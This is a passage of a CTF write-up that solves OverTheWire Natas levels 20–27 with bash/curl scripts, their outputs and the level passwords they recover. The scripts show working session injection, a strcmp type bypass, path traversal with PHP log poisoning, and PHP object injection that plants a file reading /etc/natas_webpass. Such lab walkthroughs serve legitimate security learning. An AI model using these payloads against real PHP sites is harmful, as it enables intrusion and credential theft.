<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>

<span class="nv">curlout</span><span class="o">=</span><span class="k">$(</span> <span class="se">\</span>
curl --silent <span class="se">\</span>
     --form <span class="nv">action</span><span class="o">=</span>index.php <span class="se">\</span>
     --form <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;name admin</span>
<span class="s2">admin 1&quot;</span> <span class="se">\</span>
     --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Change name&quot;</span> <span class="se">\</span>
     --user natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF <span class="se">\</span>
     http://natas20.natas.labs.overthewire.org/?debug<span class="o">=</span><span class="nb">true</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="se">\</span>
<span class="k">)</span>

<span class="nv">sid</span><span class="o">=</span><span class="si">${</span><span class="nv">curlout</span><span class="p">#*DEBUG: MYWRITE </span><span class="si">}</span>
<span class="nv">sid</span><span class="o">=</span><span class="si">${</span><span class="nv">sid</span><span class="p">%% *</span><span class="si">}</span>
<span class="nb">echo</span> <span class="s2">&quot;PHPSESSID=</span><span class="nv">$sid</span><span class="s2">&quot;</span>

<span class="nv">curlout</span><span class="o">=</span><span class="k">$(</span> <span class="se">\</span>
curl --silent <span class="se">\</span>
     --cookie <span class="s2">&quot;PHPSESSID=</span><span class="nv">$sid</span><span class="s2">&quot;</span> <span class="se">\</span>
     --form <span class="nv">action</span><span class="o">=</span>index.php <span class="se">\</span>
     --form <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;name admin</span>
<span class="s2">admin 1&quot;</span> <span class="se">\</span>
     --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Change name&quot;</span> <span class="se">\</span>
     --user natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF <span class="se">\</span>
     http://natas20.natas.labs.overthewire.org/?debug<span class="o">=</span><span class="nb">true</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="se">\</span>
<span class="k">)</span>
<span class="nv">password</span><span class="o">=</span><span class="si">${</span><span class="nv">curlout</span><span class="p">#*Password: </span><span class="si">}</span>
<span class="nv">password</span><span class="o">=</span><span class="si">${</span><span class="nv">password</span><span class="p">%%&lt;/pre*&gt;</span><span class="si">}</span>

<span class="nb">echo</span> <span class="s2">&quot;password=</span><span class="nv">$password</span><span class="s2">&quot;</span>
</pre></div>
</div>
<p>And here is the result of running the script:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">me@myhost:~/Natas$</span> ./natas20.sh
<span class="go">PHPSESSID=9cp51ros4m5eeq1oi6ilm5nd44</span>
<span class="go">password=IFekPyrQXftziDEsUr3x21sYuahypdgJ</span>
</pre></div>
</div>
</div>
<div class="section" id="id22">
<h2>3.27.21. <a class="reference external" href="http://natas21.natas.labs.overthewire.org/">Natas Level 21 -&gt; 22</a><a class="headerlink" href="#id22" title="Permalink to this headline">¶</a></h2>
<p>Level 21 Password = “IFekPyrQXftziDEsUr3x21sYuahypdgJ”</p>
<p>The web page has an <a class="reference external" href="http://natas21-experimenter.natas.labs.overthewire.org/">experimenter version</a>, both with a “view sourcecode” link. The hope is that a colocated web site will share session data, so when you exploit the experimenter site’s form by injecting an “admin” input, the session can be used on the non-experimenter side to use that “admin” field to reveal the password. Here is the exploit code:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>

<span class="nv">COOKIES</span><span class="o">=</span>natas21-cookie.txt
cat /dev/null &gt; <span class="nv">$COOKIES</span>

<span class="nv">inject</span><span class="o">=</span><span class="s2">&quot;yellow&#39; /&gt;&lt;br&gt;admin: &lt;input name=&#39;admin&#39; value=&#39;1&quot;</span>
<span class="nv">curlout</span><span class="o">=</span><span class="k">$(</span> <span class="se">\</span>
curl --silent <span class="se">\</span>
     --cookie-jar <span class="s2">&quot;</span><span class="nv">$COOKIES</span><span class="s2">&quot;</span> <span class="se">\</span>
     --form <span class="nv">action</span><span class="o">=</span>index.php <span class="se">\</span>
     --form <span class="nv">align</span><span class="o">=</span><span class="s1">&#39;center&#39;</span> <span class="se">\</span>
     --form <span class="nv">admin</span><span class="o">=</span><span class="s1">&#39;1&#39;</span> <span class="se">\</span>
     --form <span class="nv">fontsize</span><span class="o">=</span><span class="s1">&#39;100%&#39;</span> <span class="se">\</span>
     --form <span class="nv">bgcolor</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$inject</span><span class="s2">&quot;</span> <span class="se">\</span>
     --form <span class="nv">submit</span><span class="o">=</span><span class="s1">&#39;Update&#39;</span> <span class="se">\</span>
     --user natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ <span class="se">\</span>
     http://natas21-experimenter.natas.labs.overthewire.org/?debug<span class="o">=</span><span class="nb">true</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="se">\</span>
<span class="k">)</span>

<span class="nv">sid</span><span class="o">=</span><span class="s2">&quot;</span><span class="k">$(</span>cat <span class="nv">$COOKIES</span><span class="k">)</span><span class="s2">&quot;</span>
<span class="nv">sid</span><span class="o">=</span><span class="si">${</span><span class="nv">sid</span><span class="p">#*PHPSESSID?</span><span class="si">}</span>
<span class="nb">echo</span> <span class="s2">&quot;PHPSESSID=</span><span class="nv">$sid</span><span class="s2">&quot;</span>

<span class="nv">curlout</span><span class="o">=</span><span class="k">$(</span> <span class="se">\</span>
curl --silent <span class="se">\</span>
     --cookie <span class="s2">&quot;PHPSESSID=</span><span class="nv">$sid</span><span class="s2">&quot;</span> <span class="se">\</span>
     --user natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ <span class="se">\</span>
     http://natas21.natas.labs.overthewire.org/?debug<span class="o">=</span><span class="nb">true</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="se">\</span>
<span class="k">)</span>

<span class="nv">password</span><span class="o">=</span><span class="si">${</span><span class="nv">curlout</span><span class="p">#*Password: </span><span class="si">}</span>
<span class="nv">password</span><span class="o">=</span><span class="si">${</span><span class="nv">password</span><span class="p">%%&lt;/pre&gt;*</span><span class="si">}</span>
<span class="nb">echo</span> <span class="s2">&quot;password=</span><span class="nv">$password</span><span class="s2">&quot;</span>
rm <span class="nv">$COOKIES</span>
</pre></div>
</div>
<p>And here is the result of running the script:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">me@myhost:~/Natas$</span> ./natas21.sh
<span class="go">PHPSESSID=eeevtntuhp7l2sa0rr7c123ph7</span>
<span class="go">password=chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ</span>
</pre></div>
</div>
</div>
<div class="section" id="id23">
<h2>3.27.22. <a class="reference external" href="http://natas22.natas.labs.overthewire.org/">Natas Level 22 -&gt; 23</a><a class="headerlink" href="#id23" title="Permalink to this headline">¶</a></h2>
<p>Level 22 Password = “chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ”</p>
<p>The web page has a “view sourcecode” link which code analysis shows the GET parameter “revelio” reveals the password only when the session has “admin” = 1. Here’s the code for the exploit:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>

<span class="nv">curlout</span><span class="o">=</span><span class="k">$(</span> <span class="se">\</span>
curl --silent <span class="se">\</span>
     --form <span class="nv">admin</span><span class="o">=</span><span class="m">1</span> <span class="se">\</span>
     --user natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ <span class="se">\</span>
     http://natas22.natas.labs.overthewire.org/?revelio<span class="o">=</span>yes <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="se">\</span>
<span class="k">)</span>

<span class="nv">password</span><span class="o">=</span><span class="si">${</span><span class="nv">curlout</span><span class="p">#*Password: </span><span class="si">}</span>
<span class="nv">password</span><span class="o">=</span><span class="si">${</span><span class="nv">password</span><span class="p">%%&lt;/pre&gt;*</span><span class="si">}</span>
<span class="nb">echo</span> <span class="s2">&quot;password=</span><span class="nv">$password</span><span class="s2">&quot;</span>
</pre></div>
</div>
<p>And here is the result of running the script:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">me@myhost:~/Natas$</span> ./natas22.sh
<span class="go">password=D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE</span>
</pre></div>
</div>
</div>
<div class="section" id="id24">
<h2>3.27.23. <a class="reference external" href="http://natas23.natas.labs.overthewire.org/">Natas Level 23 -&gt; 24</a><a class="headerlink" href="#id24" title="Permalink to this headline">¶</a></h2>
<p>Level 23 Password = “D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE”</p>
<p>The web page has a “view sourcecode” link which code analysis shows a particular “passwd” filled into a GET form will reveal the password. Here’s the code for the exploit:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>

<span class="nv">curlout</span><span class="o">=</span><span class="k">$(</span> <span class="se">\</span>
curl --silent <span class="se">\</span>
     --form <span class="nv">passwd</span><span class="o">=</span><span class="s2">&quot;11 iloveyou&quot;</span> <span class="se">\</span>
     --user natas23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE <span class="se">\</span>
     http://natas23.natas.labs.overthewire.org/ <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="se">\</span>
<span class="k">)</span>

<span class="nv">password</span><span class="o">=</span><span class="si">${</span><span class="nv">curlout</span><span class="p">#*Password: </span><span class="si">}</span>
<span class="nv">password</span><span class="o">=</span><span class="si">${</span><span class="nv">password</span><span class="p">%%&lt;/pre&gt;*</span><span class="si">}</span>
<span class="nb">echo</span> <span class="s2">&quot;password=</span><span class="nv">$password</span><span class="s2">&quot;</span>
</pre></div>
</div>
<p>And here is the result of running the script:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">me@myhost:~/Natas$</span> ./natas23.sh
<span class="go">password=OsRmXFguozKpTZZ5X14zNO43379LZveg</span>
</pre></div>
</div>
</div>
<div class="section" id="id25">
<h2>3.27.24. <a class="reference external" href="http://natas24.natas.labs.overthewire.org/">Natas Level 24 -&gt; 25</a><a class="headerlink" href="#id25" title="Permalink to this headline">¶</a></h2>
<p>Level 24 Password = “OsRmXFguozKpTZZ5X14zNO43379LZveg”</p>
<p>The web page has a “view sourcecode” link which code analysis shows will reveal the password when the <code class="docutils literal"><span class="pre">strcmp($_REQUEST[&quot;passwd&quot;],&quot;&lt;censored&gt;&quot;)</span></code> returns 0. Well, it turns out that if there is an error (like one of the types being an array vs. a string, it returns 0 or equal. Here’s the code for the exploit:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>

<span class="nv">curlout</span><span class="o">=</span><span class="k">$(</span> <span class="se">\</span>
curl --silent <span class="se">\</span>
     --form passwd<span class="o">[]=</span><span class="s2">&quot;&quot;</span> <span class="se">\</span>
     --user natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg <span class="se">\</span>
     http://natas24.natas.labs.overthewire.org/ <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="se">\</span>
<span class="k">)</span>

<span class="nv">password</span><span class="o">=</span><span class="si">${</span><span class="nv">curlout</span><span class="p">#*Password: </span><span class="si">}</span>
<span class="nv">password</span><span class="o">=</span><span class="si">${</span><span class="nv">password</span><span class="p">%%&lt;/pre&gt;*</span><span class="si">}</span>
<span class="nb">echo</span> <span class="s2">&quot;password=</span><span class="nv">$password</span><span class="s2">&quot;</span>
</pre></div>
</div>
<p>And here is the result of running the script:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">me@myhost:~/Natas$</span> ./natas24.sh
<span class="go">password=GHF6X7YwACaYYssHVY05cFq83hRktl4c</span>
</pre></div>
</div>
</div>
<div class="section" id="id26">
<h2>3.27.25. <a class="reference external" href="http://natas25.natas.labs.overthewire.org/">Natas Level 25 -&gt; 26</a><a class="headerlink" href="#id26" title="Permalink to this headline">¶</a></h2>
<p>Level 25 Password = “GHF6X7YwACaYYssHVY05cFq83hRktl4c”</p>
<p>The web page has a “view sourcecode” link which code analysis shows two possible avenues for exploit: (1) <code class="docutils literal"><span class="pre">safeinclude()</span></code>’ing a file with the translated contents of the web page; (2) <code class="docutils literal"><span class="pre">logRequest()</span></code> writing to a log file.</p>
<p>For (1), <code class="docutils literal"><span class="pre">safeinclude()</span></code>’s replacement of “../” is easily bypassed by including “…/./” wherever you want “../”. The second check for “natas_webpass” is not easily bypassed and your humble pentester failed to get by that check. If we had then the second avenue would not be needed.</p>
<p>However, (2) allows us to write to a log file whose name and contents are partly under our control. <code class="docutils literal"><span class="pre">curl</span> <span class="pre">--cookie</span> <span class="pre">&quot;PHPSESSID=ohoh&quot;</span> <span class="pre">...</span></code> can set the log filename to <em>/tmp/natas25_ohoh.log</em>. <code class="docutils literal"><span class="pre">curl</span>&#160; <span class="pre">--user-agent</span> <span class="pre">&quot;$phpcode&quot;</span> <span class="pre">...</span></code> can log php code to display <em>/etc/natas_webpass/natas26</em>.</p>
<p>Combining both these exploits with a little bit of trial &amp; error, we set the language to “…/./…/./…/./…/./…/./tmp/natas25_ohoh.log”. Becasue of this, <code class="docutils literal"><span class="pre">safeinclude()</span></code> will generate a log file <em>/tmp/natas25_ohoh.log</em> when changing the “…/./” to “../”. And that file will display <em>/etc/natas_webpass/natas26</em> because we set upt the user-agent to include that code, revealing the password.</p>
<p>Here’s the code for the exploit:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>

<span class="nv">phpcode</span><span class="o">=</span><span class="s1">&#39;&lt;? echo file_get_contents(&quot;/etc/natas_webpass/natas26&quot;); ?&gt;&#39;</span>
<span class="nv">phpfile</span><span class="o">=</span><span class="s1">&#39;ohoh&#39;</span>
<span class="c1"># web root directory is /var/www/natas/natas25 so /tmp is 5 ../ up</span>
<span class="nv">logfile</span><span class="o">=</span><span class="s1">&#39;..././..././..././..././..././tmp/natas25_ohoh.log&#39;</span>

<span class="nv">curlout</span><span class="o">=</span><span class="k">$(</span> <span class="se">\</span>
curl --silent <span class="se">\</span>
     --cookie <span class="s2">&quot;PHPSESSID=</span><span class="nv">$phpfile</span><span class="s2">&quot;</span> <span class="se">\</span>
     --user-agent <span class="s2">&quot;</span><span class="nv">$phpcode</span><span class="s2">&quot;</span> <span class="se">\</span>
     --form <span class="nv">lang</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$logfile</span><span class="s2">&quot;</span> <span class="se">\</span>
     --user natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c <span class="se">\</span>
     http://natas25.natas.labs.overthewire.org/ <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="se">\</span>
<span class="k">)</span>

<span class="nv">password</span><span class="o">=</span><span class="si">${</span><span class="nv">curlout</span><span class="p">#*??::??:??] </span><span class="si">}</span>
<span class="nv">password</span><span class="o">=</span><span class="si">${</span><span class="nv">password</span><span class="p">%%? *</span><span class="si">}</span>
<span class="nb">echo</span> <span class="s2">&quot;password=</span><span class="nv">$password</span><span class="s2">&quot;</span>
</pre></div>
</div>
<p>And here is the result of running the script:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">me@myhost:~/Natas$</span> ./natas25.sh
<span class="go">password=oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T</span>
</pre></div>
</div>
</div>
<div class="section" id="id27">
<h2>3.27.26. <a class="reference external" href="http://natas26.natas.labs.overthewire.org/">Natas Level 26 -&gt; 27</a><a class="headerlink" href="#id27" title="Permalink to this headline">¶</a></h2>
<p>Level 26 Password = “oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T”</p>
<p>The web page has a “view sourcecode” link which code analysis shows an example of <a class="reference external" href="https://www.owasp.org/index.php/PHP_Object_Injection">PHP Object Injection</a>. It starts with an unused <code class="docutils literal"><span class="pre">Logger</span></code> class with magic <code class="docutils literal"><span class="pre">__destruct()</span></code> routine that is called when an instance is destroyed after being <code class="docutils literal"><span class="pre">unserialize()</span></code>’ed. And that <code class="docutils literal"><span class="pre">unserialize()</span></code> can come from <code class="docutils literal"><span class="pre">$drawing=unserialize(base64_decode($_COOKIE[&quot;drawing&quot;]));</span></code> which is supposed to be a “drawing” but will be a <code class="docutils literal"><span class="pre">Logger</span></code> instance. That serialized logger instance can be defined to create a log file <em>img/hackinto.php</em> with <code class="docutils literal"><span class="pre">exitMsg</span></code> set to write <code class="docutils literal"><span class="pre">echo</span> <span class="pre">file_get_contents(&quot;/etc/natas_webpass/natas27&quot;);</span></code> to the log file. Then you only have to open <a class="reference external" href="http://natas26.natas.labs.overthewire.org/img/hackinto.php">img/hackinto.php</a> to read the password.</p>
<p>Our first task is to serialize the <code class="docutils literal"><span class="pre">Logger</span></code> object. We just need the local variables set properly in the <code class="docutils literal"><span class="pre">_construct()</span></code> method. The class name and the variables are what gets serialized, not the methods nor their signatures. Here is the serialization for <code class="docutils literal"><span class="pre">Logger</span></code>. Note that even though the <code class="docutils literal"><span class="pre">Logger</span></code> class seems to force a <code class="docutils literal"><span class="pre">logFile</span></code> extension of “.log” the serialized version has “.php”. Here is <em>natas26.php</em>:</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="k">class</span> <span class="nc">Logger</span><span class="p">{</span>
    <span class="k">private</span> <span class="nv">$logFile</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$initMsg</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$exitMsg</span><span class="p">;</span>

    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
        <span class="c1">// initialise variables</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">initMsg</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exitMsg</span><span class="o">=</span><span class="s2">&quot;&lt;? echo file_get_contents(&#39;/etc/natas_webpass/natas27&#39;); ?&gt;&quot;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span> <span class="o">=</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
    <span class="p">}</span>

<span class="p">}</span>

<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="k">echo</span> <span class="s2">&quot;serialized=&quot;</span> <span class="o">.</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Logger</span><span class="p">()));</span>

<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
</div>
<p>Here is <em>natas26.sh</em>, the script to run the php file above, make the initial request with the serialized <code class="docutils literal"><span class="pre">Logger()</span></code> object (and create the “log” .php file), and the final request for the the “log” .php file.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>

<span class="nv">FILE</span><span class="o">=</span>img/hackinto.php

<span class="nv">phpout</span><span class="o">=</span><span class="k">$(</span>php natas26.php <span class="nv">$FILE</span><span class="k">)</span>
<span class="nv">serialized</span><span class="o">=</span><span class="si">${</span><span class="nv">phpout</span><span class="p">#*serialized=</span><span class="si">}</span>
<span class="nv">serialized</span><span class="o">=</span><span class="si">${</span><span class="nv">serialized</span><span class="p">%%</span>
<span class="p">*</span><span class="si">}</span>
<span class="nb">echo</span> <span class="s2">&quot;serialized=</span><span class="nv">$serialized</span><span class="s2">&quot;</span>

<span class="nv">curlout</span><span class="o">=</span><span class="k">$(</span> <span class="se">\</span>
curl --silent <span class="se">\</span>
     --cookie <span class="s2">&quot;drawing=</span><span class="nv">$serialized</span><span class="s2">&quot;</span> <span class="se">\</span>
     --user natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T <span class="se">\</span>
     http://natas26.natas.labs.overthewire.org/ <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="se">\</span>
<span class="k">)</span>

<span class="nv">curlout</span><span class="o">=</span><span class="k">$(</span> <span class="se">\</span>
curl --silent <span class="se">\</span>
     --user natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T <span class="se">\</span>
     http://natas26.natas.labs.overthewire.org/<span class="nv">$FILE</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="se">\</span>
<span class="k">)</span>

<span class="nb">echo</span> <span class="s2">&quot;password=</span><span class="nv">$curlout</span><span class="s2">&quot;</span>
</pre></div>
</div>
<p>Here’s the exploit results.</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">me@myhost:~/Natas$</span> ./natas26.sh
<span class="go">serialized=Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNjoiaW1nL2hhY2tpbnRvLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjA6IiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjU5OiI8PyBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7fQ==</span>
<span class="go">password=55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ</span>
</pre></div>
</div>
</div>
<div class="section" id="id28">
<h2>3.27.27. <a class="reference external" href="http://natas27.natas.labs.overthewire.org/">Natas Level 27</a><a class="headerlink" href="#id28" title="Permalink to this headline">¶</a></h2>
<p>Level 27 Password = “55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ”</p>
<p>“Congratulations! You have reached the end… for now.”</p>
</div>
</div>


           </div>
           <div class="articleComments">
            
           </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="try2hack.nl.html" class="btn btn-neutral float-right" title="3.28. try2hack.nl" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="nebula.html" class="btn btn-neutral" title="3.26. Exploit Exercises Nebula" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.3',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  
  
    <script type="text/javascript" src="../_static/js/theme.js"></script>
  

  
  
  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.StickyNav.enable();
      });
  </script>
   

</body>
</html>